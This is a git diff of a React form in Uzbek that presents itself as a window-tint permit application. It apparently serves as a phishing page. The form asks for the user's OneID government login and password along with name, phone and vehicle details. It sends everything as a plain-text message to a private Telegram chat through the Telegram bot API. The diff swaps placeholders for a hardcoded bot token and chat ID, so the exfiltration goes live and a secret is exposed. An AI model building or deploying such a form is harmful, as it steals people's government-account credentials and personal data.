@@ -1,9 +1,10 @@
 import { useState } from 'react';
 import { IMaskInput } from 'react-imask';
-import {toast} from "sonner";
+import { toast } from 'sonner';
 
-const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const CHAT_ID = 'YOUR_CHAT_ID';
+
+const BOT_TOKEN = '8005450451:AAEj4m1FAovWc8P4wna4QIbS21JaAXsqD6o';
+const CHAT_ID = '1163282279';
 
 export const TanirovkaForm = () => {
     const [isYuridik, setIsYuridik] = useState(false);
@@ -13,6 +14,7 @@ export const TanirovkaForm = () => {
     const [login, setLogin] = useState('');
     const [password, setPassword] = useState('');
     const [fio, setFio] = useState('');
+    const [isLoading, setIsLoading] = useState(false);
 
     const handleToggle = (value) => {
         setIsYuridik(value);
@@ -21,9 +23,11 @@ export const TanirovkaForm = () => {
 
     const handleSubmit = async () => {
         if (!autoNumber || !autoTransportId || !phone || !fio) {
-            toast.error('Iltimos, barcha majburiy maydonlarni to\'ldiring.')
+            toast.error('Iltimos, barcha majburiy maydonlarni to\'ldiring.');
             return;
         }
+
+        setIsLoading(true);
 
         const message = `
 🚘 *Tanirovka Ruxsatnoma So'rov*:
@@ -34,7 +38,7 @@ export const TanirovkaForm = () => {
 🧑‍💻 OneID login: ${login || 'Yo‘q'}
 🔒 OneID parol: ${password || 'Yo‘q'}
 📝 F.I.O: ${fio}
-    `;
+        `;
 
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -47,7 +51,8 @@ export const TanirovkaForm = () => {
                 }),
             });
 
-            toast.success('Ma\'lumotlar yuborildi ✅')
+            toast.success('Ma\'lumotlar yuborildi ✅');
+
             // Reset form
             setAutoNumber('');
             setAutoTransportId('');
@@ -55,15 +60,18 @@ export const TanirovkaForm = () => {
             setLogin('');
             setPassword('');
             setFio('');
-        } catch (error) {
-            toast.error('Yuborishda xatolik yuz berdi ❌')
+        } catch  {
+            toast.error('Yuborishda xatolik yuz berdi ❌');
+        } finally {
+            setIsLoading(false);
         }
     };
 
     return (
-        <div className="w-full h-full overflow-auto flex flex-col items-center justify-between px-[10px] py-4">
+        <div className="relative w-full h-full overflow-auto flex flex-col items-center justify-between px-[10px] py-4">
 
-            <div className="w-full h-full flex flex-col items-center gap-[16px]">
+            {/* Form Blur Area */}
+            <div className={`${isLoading ? 'blur-sm pointer-events-none' : ''} w-full h-full flex flex-col items-center gap-[16px]`}>
                 {/* Toggle */}
                 <div className="flex gap-3">
                     <button
@@ -87,9 +95,7 @@ export const TanirovkaForm = () => {
                 {/* Auto Number */}
                 <IMaskInput
                     mask={isYuridik ? '00|000aaa' : '00|a000aa'}
-                    definitions={{
-                        a: /[A-Za-z]/,
-                    }}
+                    definitions={{ a: /[A-Za-z]/ }}
                     value={autoNumber}
                     unmask={false}
                     onAccept={(value) => setAutoNumber(value.toUpperCase())}
@@ -146,13 +152,21 @@ export const TanirovkaForm = () => {
                 />
             </div>
 
-            {/* Submit */}
+            {/* Submit Button */}
             <button
                 onClick={handleSubmit}
-                className="mt-4 px-6 py-4 w-full bg-[#258385] text-white rounded-md font-semibold hover:bg-[#1f6c6d] transition"
+                disabled={isLoading}
+                className="mt-4 px-6 py-4 w-full bg-[#258385] text-white rounded-md font-semibold hover:bg-[#1f6c6d] transition disabled:opacity-50"
             >
                 Yuborish
             </button>
+
+            {/* Loader Overlay */}
+            {isLoading && (
+                <div className="absolute inset-0 flex items-center justify-center bg-white/60 z-10">
+                    <div className="w-12 h-12 border-4 border-[#258385] border-t-transparent rounded-full animate-spin"></div>
+                </div>
+            )}
         </div>
     );
 };
